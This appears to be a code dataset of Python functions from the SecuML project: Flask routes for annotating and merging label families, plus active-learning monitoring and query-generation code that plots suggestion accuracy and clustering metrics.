    annotations_db_tools.update_annotation(session, annotations_id, instance_id, label, family, iter_num, method)
    session.commit()
    if user_exp:
        exp = update_curr_exp(exp_id)
        filename = path.join(exp.output_dir(), 'user_actions.log')
        file_exists = path.isfile(filename)
        mode = 'a' if file_exists else 'w'
        to_print = ','.join(map(str, [datetime.datetime.now(), 'update_annotation', iter_num, instance_id, label, family, method]))
        with open(filename, mode) as f:
            f.write(to_print)
    return ''"
ANSSI-FR/SecuML,getLabelsFamilies,"@app.route('/getLabelsFamilies/<annotations_type>/<annotations_id>/<dataset_id>/<iter_max>/')
def getLabelsFamilies(annotations_type, annotations_id, dataset_id, iter_max):
    iter_max = None if iter_max == 'None' else int(iter_max)
    annotations_type = AnnotationsTypes[annotations_type]
    return jsonify(annotations_db_tools.get_labels_families(session, annotations_type, annotations_id, dataset_id, iter_max=iter_max))"
ANSSI-FR/SecuML,getFamiliesInstances,"@app.route('/getFamiliesInstances/<annotations_type>/<annotations_id>/<dataset_id>/<label>/<iter_max>/')
def getFamiliesInstances(annotations_type, annotations_id, dataset_id, label, iter_max):
    annotations_type = AnnotationsTypes[annotations_type]
    iter_max = None if iter_max == 'None' else int(iter_max)
    families = annotations_db_tools.get_labels_families(session, annotations_type, annotations_id, dataset_id, iter_max=iter_max)
    instances = {}
    for f in families[label]:
        instances[f] = annotations_db_tools.get_label_family_ids(session, annotations_type, annotations_id, dataset_id, label, family=f, iter_max=iter_max)
    return jsonify(instances)"
ANSSI-FR/SecuML,changeFamilyName,"@app.route('/changeFamilyName/<exp_id>/<annotations_id>/<label>/<family>/<new_family>/')
def changeFamilyName(exp_id, annotations_id, label, family, new_family):
    annotations_db_tools.change_family_name(session, annotations_id, label, family, new_family)
    session.commit()
    if user_exp:
        exp = update_curr_exp(exp_id)
        filename = path.join(exp.output_dir(), 'user_actions.log')
        file_exists = path.isfile(filename)
        mode = 'a' if file_exists else 'w'
        to_print = ','.join(map(str, [datetime.datetime.now(), 'change_family_name', family, new_family]))
        with open(filename, mode) as f:
            f.write(to_print)
    return ''"
ANSSI-FR/SecuML,changeFamilyLabel,"@app.route('/changeFamilyLabel/<exp_id>/<annotations_id>/<label>/<family>/')
def changeFamilyLabel(exp_id, annotations_id, label, family):
    annotations_db_tools.change_family_label(session, annotations_id, label, family)
    session.commit()
    if user_exp:
        exp = update_curr_exp(exp_id)
        filename = path.join(exp.output_dir(), 'user_actions.log')
        file_exists = path.isfile(filename)
        mode = 'a' if file_exists else 'w'
        to_print = ','.join(map(str, [datetime.datetime.now(), 'change_family_label', family, label]))
        with open(filename, mode) as f:
            f.write(to_print)
    return ''"
ANSSI-FR/SecuML,mergeFamilies,"@app.route('/mergeFamilies/<exp_id>/<annotations_id>/<label>/<families>/<new_family>/')
def mergeFamilies(exp_id, annotations_id, label, families, new_family):
    families = families.split(',')
    annotations_db_tools.merge_families(session, annotations_id, label, families, new_family)
    session.commit()
    if user_exp:
        exp = update_curr_exp(exp_id)
        filename = path.join(exp.output_dir(), 'user_actions.log')
        file_exists = path.isfile(filename)
        mode = 'a' if file_exists else 'w'
        to_print = ','.join(map(str, [datetime.datetime.now(), 'merge_families', new_family] + families))
        with open(filename, mode) as f:
            f.write(to_print)
    return ''"
ANSSI-FR/SecuML,update_curr_exp,"def update_curr_exp(exp_id):
    return experiment.get_factory().from_exp_id(exp_id, secuml_conf, session)"
ANSSI-FR/SecuML,secumlMenu,"@app.route('/SecuML/')
def secumlMenu():
    return render_template('menus/main.html')"
ANSSI-FR/SecuML,secumlRootMenu,"@app.route('/')
def secumlRootMenu():
    return redirect('/SecuML/')"
ANSSI-FR/SecuML,projectMenu,"@app.route('/SecuML/<project>/menu/')
def projectMenu(project):
    return render_template('menus/projects.html')"
ANSSI-FR/SecuML,datasetMenu,"@app.route('/SecuML/<project>/<dataset>/menu/')
def datasetMenu(project, dataset):
    return render_template('menus/datasets.html')"
ANSSI-FR/SecuML,getExperiment,"@app.route('/SecuML/<exp_id>/')
def getExperiment(exp_id):
    exp = update_curr_exp(exp_id)
    return render_template(exp.web_template(), project=exp.exp_conf.dataset_conf.project)"
ANSSI-FR/SecuML,getProjects,"@app.route('/getProjects/')
def getProjects():
    query = session.query(DatasetsAlchemy.project).distinct()
    return jsonify({'projects': [r.project for r in query.all()]})"
ANSSI-FR/SecuML,getDatasets,"@app.route('/getDatasets/<project>/')
def getDatasets(project):
    query = session.query(DatasetsAlchemy)
    query = query.filter(DatasetsAlchemy.project == project)
    return jsonify({'datasets': [r.dataset for r in query.all()]})"
ANSSI-FR/SecuML,getConf,"@app.route('/getConf/<exp_id>/')
def getConf(exp_id):
    (project, dataset) = get_project_dataset(session, exp_id)
    conf_filename = os.path.join(secuml_conf.output_data_dir, project, dataset, str(exp_id), 'conf.json')
    return send_file(conf_filename)"
ANSSI-FR/SecuML,hasGroundTruth,"@app.route('/hasGroundTruth/<project>/<dataset>/')
def hasGroundTruth(project, dataset):
    query = session.query(DatasetsAlchemy)
    query = query.filter(DatasetsAlchemy.project == project)
    query = query.filter(DatasetsAlchemy.dataset == dataset)
    return str(query.one().ground_truth_hash is not None)"
ANSSI-FR/SecuML,getAllExperiments,"@app.route('/getAllExperiments/<project>/<dataset>/')
def getAllExperiments(project, dataset):
    query = session.query(ExpAlchemy)
    query = query.join(ExpAlchemy.features_set)
    query = query.join(FeaturesSetsAlchemy.dataset)
    query = query.outerjoin(ExpAlchemy.parents)
    query = query.filter(DatasetsAlchemy.project == project)
    query = query.filter(DatasetsAlchemy.dataset == dataset)
    query = query.filter(ExpRelationshipsAlchemy.parent_id == null())
    experiments = {}
    for exp in query.all():
        if exp.kind not in experiments:
            experiments[exp.kind] = []
        experiments[exp.kind].append({'name': exp.name, 'id': exp.id})
    for (k, v) in experiments.items():
        t = [(x['id'], x['name']) for x in v]
        t.sort(key=operator.itemgetter(0), reverse=True)
        experiments[k] = t
    return jsonify(experiments)"
ANSSI-FR/SecuML,getFeaturesAnalysisExp,"@app.route('/getFeaturesAnalysisExp/<exp_id>/')
def getFeaturesAnalysisExp(exp_id):
    exp = update_curr_exp(exp_id)
    features_exp_id = None
    features_set_id = exp.exp_conf.features_conf.set_id
    query = exp.session.query(FeaturesAnalysisExpAlchemy)
    query = query.filter(FeaturesAnalysisExpAlchemy.features_set_id == features_set_id)
    query = query.filter(FeaturesAnalysisExpAlchemy.annotations_filename == 'GROUND_TRUTH')
    query = query.order_by(desc(FeaturesAnalysisExpAlchemy.id))
    res = query.first()
    if res is not None:
        features_exp_id = res.id
    else:
        query = exp.session.query(FeaturesAnalysisExpAlchemy)
        query = query.filter(FeaturesAnalysisExpAlchemy.features_set_id == features_set_id)
        query = query.order_by(desc(FeaturesAnalysisExpAlchemy.id))
        res = query.first()
        if res is not None:
            features_exp_id = res.id
    return str(features_exp_id)"
ANSSI-FR/SecuML,featuresExp,"@app.route('/SecuML/featuresExp/<exp_id>/<f_user_id>/')
def featuresExp(exp_id, f_user_id):
    exp = update_curr_exp(exp_id)
    features_set_id = exp.exp_conf.features_conf.set_id
    query = exp.session.query(FeaturesAlchemy)
    query = query.filter(FeaturesAlchemy.set_id == features_set_id)
    query = query.filter(FeaturesAlchemy.user_id == f_user_id)
    f_id = query.one().id
    return redirect('/SecuML/%s/%i/' % (exp_id, f_id))"
ANSSI-FR/SecuML,getFeaturesAnalysisExperiment,"@app.route('/SecuML/<exp_id>/<f_id>/')
def getFeaturesAnalysisExperiment(exp_id, f_id):
    exp = update_curr_exp(exp_id)
    return render_template(exp.web_template())"
ANSSI-FR/SecuML,getInstance,"@app.route('/getInstance/<exp_id>/<view_id>/<instance_id>/')
def getInstance(exp_id, view_id, instance_id):
    try:
        if view_id == 'None':
            view_id = None
        experiment = update_curr_exp(exp_id)
        dataset_id = experiment.exp_conf.dataset_conf.dataset_id
        (ident, user_id) = idents_tools.get_ident(session, dataset_id, instance_id)
        project = experiment.exp_conf.dataset_conf.project
        module = importlib.import_module('secuml.web.views.projects.%s' % project)
        return module.get_instance(experiment, view_id, user_id, ident)
    except ImportError as e:
        app.logger.error(str(e))
        app.logger.error('Please create the project file ""%s.py"" in secuml/web/views/projects/' % project)
        return ('Unable to display the instance', ident)"
ANSSI-FR/SecuML,getIdent,"@app.route('/getIdent/<exp_id>/<instance_id>/')
def getIdent(exp_id, instance_id):
    query = session.query(InstancesAlchemy)
    query = query.join(InstancesAlchemy.dataset)
    query = query.join(DatasetsAlchemy.features)
    query = query.join(FeaturesSetsAlchemy.experiments)
    query = query.filter(ExpAlchemy.id == exp_id)
    query = query.filter(InstancesAlchemy.id == instance_id)
    res = query.one()
    return jsonify({'ident': res.ident, 'user_id': res.user_instance_id})"
ANSSI-FR/SecuML,getFeatures,"@app.route('/getFeatures/<exp_id>/<instance_id>/')
def getFeatures(exp_id, instance_id):
    instance_id = int(instance_id)
    experiment = update_curr_exp(exp_id)
    (f_names, _, f_values) = FeaturesFromExp.get_instance(experiment, instance_id)
    return jsonify({f_names[i]: v for (i, v) in enumerate(f_values)})"
ANSSI-FR/SecuML,nocache,"def nocache(view):

    @wraps(view)
    def no_cache(*args, **kwargs):
        response = make_response(view(*args, **kwargs))
        response.headers['Last-Modified'] = datetime.now()
        response.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, post-check=0, pre-check=0, max-age=0'
        response.headers['Pragma'] = 'no-cache'
        response.headers['Expires'] = '-1'
        return response
    return update_wrapper(no_cache, view)"
ANSSI-FR/SecuML,no_cache,"@wraps(view)
def no_cache(*args, **kwargs):
    response = make_response(view(*args, **kwargs))
    response.headers['Last-Modified'] = datetime.now()
    response.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, post-check=0, pre-check=0, max-age=0'
    response.headers['Pragma'] = 'no-cache'
    response.headers['Expires'] = '-1'
    return response"
ANSSI-FR/SecuML,__init__,"def __init__(self, monitoring):
    self.monitoring = monitoring
    self.homogeneity_estimators = ['homogeneity', 'completeness', 'v_measure']
    self.adjusted_estimators = ['adjusted_rand_score', 'adjusted_mutual_info_score']
    self.all_estimators = self.homogeneity_estimators
    self.all_estimators.extend(self.adjusted_estimators)
    self.evolution_file = path.join(self.monitoring.AL_directory, 'homogeneity_monitoring.csv')
    self.annotations = self.monitoring.iteration.annotations
    self.set_output_dir()"
ANSSI-FR/SecuML,set_output_dir,"def set_output_dir(self):
    self.output_dir = path.join(self.monitoring.iteration_dir, 'clustering_evaluation')
    os.makedirs(self.output_dir)"
ANSSI-FR/SecuML,iteration_monitoring,"def iteration_monitoring(self):
    self.display_csv_line()"
ANSSI-FR/SecuML,evolution_monitoring,"def evolution_monitoring(self):
    self.load_evolution()
    self.plot_evolution()"
ANSSI-FR/SecuML,display_csv_line,"def display_csv_line(self):
    if self.monitoring.iter_num == 1:
        self.display_csv_header()
    clusterings = self.annotations.getClusteringsEvaluations()
    with open(self.evolution_file, 'a') as f:
        v = []
        v.append(self.monitoring.iter_num)
        for (l, evaluation) in clusterings.items():
            if evaluation is not None:
                for e in self.all_estimators:
                    v.append(getattr(evaluation, e))
            else:
                v.extend([0 for _ in range(len(self.all_estimators))])
        csv_writer = csv.writer(f)
        csv_writer.writerow(v)"
ANSSI-FR/SecuML,display_csv_header,"def display_csv_header(self):
    with open(self.evolution_file, 'w') as f:
        header = ['iteration']
        clusterings = self.annotations.getClusteringsEvaluations()
        for l in list(clusterings.keys()):
            for e in self.all_estimators:
                header.append(l + '_' + e)
        csv_writer = csv.writer(f)
        csv_writer.writerow(header)"
ANSSI-FR/SecuML,load_evolution,"def load_evolution(self):
    with open(self.evolution_file, 'r') as f:
        self.data = pd.read_csv(f, header=0, index_col=0)"
ANSSI-FR/SecuML,plot_evolution,"def plot_evolution(self, estimator=None):
    if estimator is None:
        for e in self.all_estimators:
            self.plot_evolution(estimator=e)
    else:
        iterations = list(range(self.monitoring.iter_num))
        plt.clf()
        max_value = 1
        clusterings = self.annotations.getClusteringsEvaluations()
        for l in list(clusterings.keys()):
            label = l + '_' + estimator
            plt.plot(iterations, self.data.loc[:][label], label='%s Clustering' % l.title(), color=get_label_color(l), linewidth=4, marker='o')
        plt.ylim(0, max_value)
        plt.xlabel('Iteration')
        plt.ylabel(estimator)
        lgd = plt.legend(bbox_to_anchor=(0.0, 1.02, 1.0, 0.102), loc=3, ncol=2, mode='expand', borderaxespad=0.0, fontsize='large')
        filename = path.join(self.output_dir, '%s_monitoring.png' % estimator)
        plt.savefig(filename, bbox_extra_artists=(lgd,), bbox_inches='tight')
        plt.clf()"
ANSSI-FR/SecuML,__init__,"def __init__(self, monitoring):
    self.monitoring = monitoring
    instances = self.monitoring.datasets.instances
    self.has_ground_truth = instances.has_ground_truth()"
ANSSI-FR/SecuML,generate,"def generate(self):
    instances = self.monitoring.datasets.instances
    self.stats = {}
    for l in [MALICIOUS, BENIGN]:
        self.stats[l] = {}
        self.stats[l]['annotations'] = int(instances.num_instances(label=l))
        self.stats[l]['families'] = len(instances.annotations.get_families_values(label=l))
    self.stats['global'] = {}
    for k in ['annotations', 'families']:
        self.stats['global'][k] = int(self.stats[MALICIOUS][k] + self.stats[BENIGN][k])
    self.stats['unlabeled'] = instances.num_instances() - self.stats['global']['annotations']"
ANSSI-FR/SecuML,export,"def export(self, al_dir, iteration_dir):
    (monitoring_dir, evolution_dir) = self.get_ouput_dirs(al_dir, iteration_dir)
    evolution_file = path.join(evolution_dir, 'labels_monitoring.csv')
    monitoring_file = path.join(monitoring_dir, 'labels_monitoring.json')
    self.export_to_json(monitoring_file)
    self.display_csv_line(evolution_file)
    self.plot_evolution(evolution_file, monitoring_dir)"
ANSSI-FR/SecuML,get_ouput_dirs,"def get_ouput_dirs(self, al_dir, iteration_dir):
    monitoring_dir = path.join(iteration_dir, 'labels_monitoring')
    os.makedirs(monitoring_dir)
    evolution_dir = path.join(al_dir, 'labels_monitoring')
    if self.monitoring.iter_num == 1:
        os.makedirs(evolution_dir)
    return (monitoring_dir, evolution_dir)"
ANSSI-FR/SecuML,export_to_json,"def export_to_json(self, monitoring_file):
    with open(monitoring_file, 'w') as f:
        json.dump(self.stats, f, indent=2)"
ANSSI-FR/SecuML,display_csv_line,"def display_csv_line(self, evolution_file):
    if self.monitoring.iter_num == 1:
        self.display_csv_header(evolution_file)
    with open(evolution_file, 'a') as f:
        v = []
        v.append(self.monitoring.iter_num)
        for k in ['annotations', 'families']:
            for l in [MALICIOUS, BENIGN, 'global']:
                v.append(self.stats[l][k])
        csv_writer = csv.writer(f)
        csv_writer.writerow(v)"
ANSSI-FR/SecuML,display_csv_header,"def display_csv_header(self, evolution_file):
    with open(evolution_file, 'w') as f:
        header = ['iteration']
        for k in ['annotations_', 'families_']:
            for l in [MALICIOUS, BENIGN, 'global']:
                header.append(k + l)
        csv_writer = csv.writer(f)
        csv_writer.writerow(header)"
ANSSI-FR/SecuML,load_evolution,"def load_evolution(self, evolution_file):
    with open(evolution_file, 'r') as f:
        data = pd.read_csv(f, header=0, index_col=0)
    self.evolutions = {}
    for l in ['global', MALICIOUS, BENIGN]:
        self.evolutions[l] = {}
        for k in ['annotations', 'families']:
            self.evolutions[l][k] = list(data.loc[:][k + '_' + l])"
ANSSI-FR/SecuML,plot_evolution,"def plot_evolution(self, evolution_file, iteration_dir):
    self.load_evolution(evolution_file)
    self.plot_families_evolution(iteration_dir)"
ANSSI-FR/SecuML,plot_families_evolution,"def plot_families_evolution(self, iteration_dir):
    annotations = self.evolutions['global']['annotations']
    plt.clf()
    if self.has_ground_truth:
        max_value = 1
    else:
        max_value = max(self.stats[MALICIOUS]['families'], self.stats[BENIGN]['families'])
    for l in [MALICIOUS, BENIGN]:
        evolution = self.evolutions[l]['families']
        num_families = 0
        if self.has_ground_truth:
            instances = self.monitoring.datasets.instances
            num_families = len(instances.ground_truth.get_families_values(label=l))
            if num_families > 0:
                evolution = [x / num_families for x in evolution]
        plt.plot(annotations, evolution, label=l.title(), color=get_label_color(l), linewidth=4, marker='o')
    plt.ylim(0, max_value)
    plt.xlabel('Num Annotations')
    if self.has_ground_truth and num_families > 0:
        plt.ylabel('Prop. Families Discovered')
    else:
        plt.ylabel('Num. Families Discovered')
    lgd = plt.legend(bbox_to_anchor=(0.0, 1.02, 1.0, 0.102), loc=3, ncol=2, mode='expand', borderaxespad=0.0, fontsize='x-large')
    filename = path.join(iteration_dir, 'families_monitoring.png')
    plt.savefig(filename, bbox_extra_artists=(lgd,), bbox_inches='tight')
    plt.clf()"
ANSSI-FR/SecuML,__init__,"def __init__(self, monitoring, kind, labels_families):
    self.monitoring = monitoring
    self.kind = kind
    self.labels_families = labels_families
    self.init_counts()"
ANSSI-FR/SecuML,init_counts,"def init_counts(self):
    self.num_annotations = 0
    self.num_suggestions = 0
    self.true_suggestions = 0
    self.false_suggestions = 0
    self.no_suggestion = 0"
ANSSI-FR/SecuML,add_annotation,"def add_annotation(self, suggestion, answer):
    self.num_annotations += 1
    if suggestion is None:
        self.no_suggestion += 1
    elif suggestion == answer:
        self.true_suggestions += 1
        self.num_suggestions += 1
    else:
        self.false_suggestions += 1
        self.num_suggestions += 1"
ANSSI-FR/SecuML,export,"def export(self, monitoring_dir, evolution_dir):
    filename = '_'.join([self.labels_families, self.kind, 'suggestions.csv'])
    evolution_file = path.join(evolution_dir, filename)
    self.display_csv_line(evolution_file)
    self.plot_evolution(evolution_file, monitoring_dir)"
ANSSI-FR/SecuML,display_csv_line,"def display_csv_line(self, evolution_file):
    if self.monitoring.iter_num == 1:
        self.display_csv_header(evolution_file)
    with open(evolution_file, 'a') as f:
        v = [self.monitoring.iter_num]
        v.extend([self.true_suggestions, self.false_suggestions, self.no_suggestion, self.num_suggestions, self.num_annotations])
        csv_writer = csv.writer(f)
        csv_writer.writerow(v)"
ANSSI-FR/SecuML,display_csv_header,"def display_csv_header(self, evolution_file):
    with open(evolution_file, 'w') as f:
        header = ['iteration']
        header.extend(['true_suggestions', 'false_suggestions', 'no_suggestion', 'num_suggestions', 'num_annotations'])
        csv_writer = csv.writer(f)
        csv_writer.writerow(header)"
ANSSI-FR/SecuML,load_evolution,"def load_evolution(self, evolution_file):
    with open(evolution_file, 'r') as f:
        data = pd.read_csv(f, header=0, index_col=0)
        return data"
ANSSI-FR/SecuML,plot_evolution,"def plot_evolution(self, evolution_file, monitoring_dir):
    data = self.load_evolution(evolution_file)
    if self.labels_families == 'labels':
        title = 'Labels Suggestions Accuracy'
    elif self.labels_families == 'families':
        title = 'Families Suggestions Accuracy'
    values = data['true_suggestions'] / data['num_suggestions']
    plot = PlotDataset(values.values, title)
    iterations = list(range(self.monitoring.iter_num))
    plt.clf()
    max_value = 1
    plt.plot(iterations, plot.values, label=plot.label, color=plot.color, linewidth=plot.linewidth, marker=plot.marker)
    plt.ylim(0, max_value)
    plt.xlabel('Iteration')
    plt.ylabel('Suggestions Accuracy')
    lgd = plt.legend(bbox_to_anchor=(0.0, 1.02, 1.0, 0.102), loc=3, ncol=2, mode='expand', borderaxespad=0.0, fontsize='large')
    filename = '_'.join([self.labels_families, self.kind, 'suggestions.png'])
    filename = path.join(monitoring_dir, filename)
    plt.savefig(filename, bbox_extra_artists=(lgd,), bbox_inches='tight')
    plt.clf()
    self.data = data"
ANSSI-FR/SecuML,__init__,"def __init__(self, monitoring, labels_families):
    self.labels_families = labels_families
    self.init_counts(monitoring)"
ANSSI-FR/SecuML,init_counts,"def init_counts(self, monitoring):
    self.all_counts = SuggestionsAccuracyCounts(monitoring, 'all', self.labels_families)
    self.high_confidence_counts = SuggestionsAccuracyCounts(monitoring, 'high_confidence', self.labels_families)"
ANSSI-FR/SecuML,add_annotation,"def add_annotation(self, suggestion, answer, confidence):
    self.all_counts.add_annotation(suggestion, answer)
    if confidence == 'low':
        self.high_confidence_counts.add_annotation(None, answer)
    elif confidence == 'high':
        self.high_confidence_counts.add_annotation(suggestion, answer)"
ANSSI-FR/SecuML,generate,"def generate(self):
    return"
ANSSI-FR/SecuML,export,"def export(self, monitoring_dir, evolution_dir, kind=None):
    if kind is None:
        self.export(monitoring_dir, evolution_dir, kind='all')
        self.export(monitoring_dir, evolution_dir, kind='high_confidence')
        return
    if kind == 'all':
        counts = self.all_counts
    elif kind == 'high_confidence':
        counts = self.high_confidence_counts
    counts.export(monitoring_dir, evolution_dir)"
ANSSI-FR/SecuML,__init__,"def __init__(self, monitoring):
    self.monitoring = monitoring
    self.labels_accuracy = SuggestionsAccuracyLabelsFamilies(monitoring, 'labels')
    self.families_accuracy = SuggestionsAccuracyLabelsFamilies(monitoring, 'families')"
ANSSI-FR/SecuML,add_annotation,"def add_annotation(self, suggested_label, suggested_family, label, family, confidence):
    self.labels_accuracy.add_annotation(suggested_label, label, confidence)
    self.families_accuracy.add_annotation(suggested_family, family, confidence)"
ANSSI-FR/SecuML,generate,"def generate(self):
    self.labels_accuracy.generate()
    self.families_accuracy.generate()"
ANSSI-FR/SecuML,export,"def export(self, al_dir, iteration_dir):
    (monitoring_dir, evolution_dir) = self.get_ouput_dirs(al_dir, iteration_dir)
    self.labels_accuracy.export(monitoring_dir, evolution_dir)
    self.families_accuracy.export(monitoring_dir, evolution_dir)
    self.plot_evolution(monitoring_dir)"
ANSSI-FR/SecuML,plot_evolution,"def plot_evolution(self, monitoring_dir):
    iterations = list(range(1, self.monitoring.iter_num + 1))
    plt.clf()
    data = self.labels_accuracy.high_confidence_counts.data
    values = data['true_suggestions'] / data['num_suggestions']
    plot = PlotDataset(values.values, 'Labels Suggestions')
    max_value = 1
    plt.plot(iterations, plot.values, label=plot.label, color=plot.color, linewidth=plot.linewidth, marker=plot.marker)
    data = self.families_accuracy.high_confidence_counts.data
    values = data['true_suggestions'] / data['num_suggestions']
    plot = PlotDataset(values.values, 'Families Suggestions')
    max_value = 1
    plt.plot(iterations, plot.values, label=plot.label, color='purple', linewidth=plot.linewidth, marker=plot.marker)
    plt.ylim(0, max_value)
    plt.xlabel('Iteration')
    plt.ylabel('Suggestions Accuracy')
    lgd = plt.legend(bbox_to_anchor=(0.0, 1.02, 1.0, 0.102), loc=3, ncol=2, mode='expand', borderaxespad=0.0, fontsize='large')
    filename = path.join(monitoring_dir, 'labels_families_high_confidence_suggestions.png')
    plt.savefig(filename, bbox_extra_artists=(lgd,), bbox_inches='tight')
    plt.clf()"
ANSSI-FR/SecuML,get_ouput_dirs,"def get_ouput_dirs(self, al_dir, iteration_dir):
    monitoring_dir = path.join(iteration_dir, 'suggestions_accuracy')
    os.makedirs(monitoring_dir)
    evolution_dir = path.join(al_dir, 'suggestions_accuracy')
    if self.monitoring.iter_num == 1:
        os.makedirs(evolution_dir)
    return (monitoring_dir, evolution_dir)"
ANSSI-FR/SecuML,__init__,"def __init__(self, iteration, label=None):
    self.iteration = iteration
    self.label = label
    self.annotation_queries = []"
ANSSI-FR/SecuML,run,"def run(self, predictions, already_queried=None):
    self._set_predictions(predictions)
    self.run_models()
    start_time = time.time()
    self.generate_queries(already_queried=already_queried)
    self.exec_time = time.time() - start_time
    self.export()"
ANSSI-FR/SecuML,get_ids,"def get_ids(self):
    return [q.instance_id for q in self.annotation_queries]"
ANSSI-FR/SecuML,get_confidences,"def get_confidences(self):
    return [q.confidence for q in self.annotation_queries]"
ANSSI-FR/SecuML,run_models,"@abc.abstractmethod
def run_models(self):
    return"
ANSSI-FR/SecuML,generate_queries,"@abc.abstractmethod
def generate_queries(self, already_queried=None):
    return"
ANSSI-FR/SecuML,_set_predictions,"def _set_predictions(self, predictions):
    self.predictions = predictions"
ANSSI-FR/SecuML,add_query,"def add_query(self, query):
    self.annotation_queries.append(query)"
ANSSI-FR/SecuML,export,"def export(self):
    iteration_dir = self.iteration.iteration_dir
    if iteration_dir is None:
        return
    if self.label is None:
        filename = 'toannotate.csv'
    else:
        filename = 'toannotate_%s.csv' % self.label
    filename = path.join(iteration_dir, filename)
    with open(filename, 'w') as f:
        for (i, annotation_query) in enumerate(self.annotation_queries):
            if i == 0:
                annotation_query.display_header(f)
            annotation_query.export(f)"
ANSSI-FR/SecuML,annotate_auto,"def annotate_auto(self):
    for annotation_query in self.annotation_queries:
        annotation_query.annotate_auto(self.iteration, self.label)"
ANSSI-FR/SecuML,get_manual_annotations,"def get_manual_annotations(self):
    for annotation_query in self.annotation_queries:
        annotation_query.get_manual_annotation(self.iteration)"
ANSSI-FR/SecuML,get_instance_ids,"def get_instance_ids(self):
    return [annotation_query.instance_id for annotation_query in self.annotation_queries]"
ANSSI-FR/SecuML,__str__,"def __str__(self):
    return 'The annotation budget has run out'"
ANSSI-FR/SecuML,__init__,"def __init__(self, instance_id, predicted_proba, suggested_label, suggested_family, confidence=None):
    self.instance_id = instance_id
    self.predicted_proba = predicted_proba
    self.suggested_label = suggested_label
    self.suggested_family = suggested_family
    self.confidence = confidence"
ANSSI-FR/SecuML,display_header,"def display_header(self, f):
    csv_writer = csv.writer(f)
    csv_writer.writerow(['instance_id', 'predicted_proba', 'suggested_label', 'suggested_family', 'confidence'])"
ANSSI-FR/SecuML,export,"def export(self, f):
    csv_writer = csv.writer(f)
    csv_writer.writerow([self.instance_id, self.predicted_proba, self.suggested_label, self.suggested_family, self.confidence])"
ANSSI-FR/SecuML,to_json,"def to_json(self):
    return {'instance_id': self.instance_id, 'predicted_proba': self.predicted_proba, 'suggested_label': self.suggested_label, 'suggested_family': self.suggested_family, 'confidence': self.confidence}"
ANSSI-FR/SecuML,update_datasets,"def update_datasets(self, iteration, label, family):
    if iteration.budget <= 0:
        raise NoAnnotationBudget()
    iteration.budget -= 1
    iteration.datasets.update(self.instance_id, label, family)
    iteration.suggestions_accuracy.add_annotation(self.suggested_label, self.suggested_family, label, family, self.confidence)"
ANSSI-FR/SecuML,__str__,"def __str__(self):
    return 'Aladin requires that the initial annotated dataset contains at least two different families.'"
ANSSI-FR/SecuML,__init__,"def __init__(self, iteration, conf):
    Queries.__init__(self, iteration)
    self.num_annotations = conf.num_annotations
    self.conf = conf
    datasets = self.iteration.datasets
    self.train_instances = datasets.instances.get_annotated_instances()
    self.test_instances = datasets.get_unlabeled_instances()
    self.check_input_data()"
ANSSI-FR/SecuML,run_models,"def run_models(self):
    self._run_logistic_regression()
    self._run_naive_bayes()"
ANSSI-FR/SecuML,generate_queries,"def generate_queries(self, already_queried=None):
    self.compute_scores()
    self._gen_queries_from_scores()"
ANSSI-FR/SecuML,check_input_data,"def check_input_data(self):
    families = set(self.train_instances.annotations.get_families())
    if len(families) < 2:
        raise AladinAtLeastTwoFamilies()"
ANSSI-FR/SecuML,_run_logistic_regression,"def _run_logistic_regression(self):
    return None"
ANSSI-FR/SecuML,_run_naive_bayes,"def _run_naive_bayes(self):
    naive_bayes_conf = self._create_naive_bayes_conf()
    self.test_instances.annotations.set_families(self.lr_predicted_labels)
    train_instances = copy.deepcopy(self.train_instances)
    train_instances.union(self.test_instances)
    self.eval_clustering_perf(train_instances)
    self.naive_bayes = GaussianNaiveBayes(naive_bayes_conf)
    self.nb_time = self.naive_bayes.training(train_instances)
    num_test_instances = self.test_instances.num_instances()
    self.test_instances.annotations.set_families(None)
    start_time = time.time()
    if num_test_instances == 0:
        self.nb_predicted_labels = []
    else:
        self.nb_predicted_labels = self.naive_bayes.pipeline.predict(self.test_instances.features.get_values())
    self.nb_time.add(TrainingExecTimes(time.time() - start_time, 0))
    self.nb_time = self.nb_time.total()
    self.nb_class_labels = self.naive_bayes.class_labels"
ANSSI-FR/SecuML,eval_clustering_perf,"def eval_clustering_perf(self, instances):
    self.clustering_perf = PerformanceIndicators()
    self.clustering_perf.gen_eval(instances.ground_truth.get_families(), instances.annotations.get_families())"
ANSSI-FR/SecuML,compute_scores,"def compute_scores(self):
    self._create_scores_df()
    self._compute_uncertainty_scores()
    self._compute_anomalous_scores()"
ANSSI-FR/SecuML,_create_scores_df,"def _create_scores_df(self):
    num_test_instances = self.test_instances.num_instances()
    header = ['lr_prediction', 'lr_score', 'nb_prediction', 'nb_score', 'queried']
    self.scores = pd.DataFrame(np.zeros((num_test_instances, len(header))), index=self.test_instances.ids.get_ids(), columns=header)
    self.scores['queried'] = [False] * num_test_instances"
ANSSI-FR/SecuML,_compute_uncertainty_scores,"def _compute_uncertainty_scores(self):
    self.scores['lr_prediction'] = self.lr_predicted_labels
    lr_scores = []
    for (i, predicted_label) in enumerate(self.scores['lr_prediction']):
        predicted_label_index = np.where(self.lr_class_labels == predicted_label)[0]
        predicted_proba = self.lr_predicted_proba[i, predicted_label_index]
        proba = predicted_proba - self.lr_predicted_proba[i, :]
        proba[predicted_label_index] = 2
        score = np.min(proba)
        lr_scores.append(score)
    self.scores['lr_score'] = lr_scores"
ANSSI-FR/SecuML,_compute_anomalous_scores,"def _compute_anomalous_scores(self):
    self.scores['nb_prediction'] = self.nb_predicted_labels
    for c in set(self.nb_predicted_labels):
        selection = self.scores['nb_prediction'] == c
        c_ids = self.scores.loc[selection].index.values
        c_instances = self.test_instances.get_from_ids(c_ids)
        c_features = c_instances.features.values
        c_likelihood = self.naive_bayes.log_likelihood(c_features, c)
        self.scores.loc[selection, 'nb_score'] = c_likelihood"
ANSSI-FR/SecuML,_gen_queries_from_scores,"def _gen_queries_from_scores(self):
    assert np.array_equal(self.lr_class_labels, self.nb_class_labels)
    lr_predicted_proba_df = self.gen_lr_predicted_proba_df()
    num_families = len(self.lr_class_labels)
    self.annotation_queries = []
    if self.num_annotations <= num_families:
        if self.iteration.iter_num % 2 == 0:
            classifier = 'lr'
        else:
            classifier = 'nb'
        sort_data_frame(self.scores, '%s_score' % classifier, True, True)
        selected_instances = self.scores.index.tolist()[:self.num_annotations]
        for instance_id in selected_instances:
            query = self.generate_query(instance_id, 0, None, None)
            self.add_query(query)
        return
    num_uncertain = [0] * num_families
    num_anomalous = [0] * num_families
    families_scores = self._gen_families_scores_tables()
    num_annotations = 0
